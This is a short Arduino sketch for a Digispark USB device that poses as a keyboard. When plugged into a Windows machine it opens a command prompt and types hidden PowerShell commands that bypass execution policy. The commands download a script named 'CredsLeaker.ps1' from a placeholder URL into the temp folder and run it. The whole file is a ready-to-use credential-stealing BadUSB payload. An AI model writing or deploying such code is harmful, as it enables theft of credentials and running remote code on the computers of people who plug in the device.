#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass \"Invoke-RestMethod -uri \"YOUR_URL/CredsLeaker.ps1\" -OutFile %TEMP%\cl.ps1\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass -file %TEMP%\cl.ps1 -mode \"dynamic\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
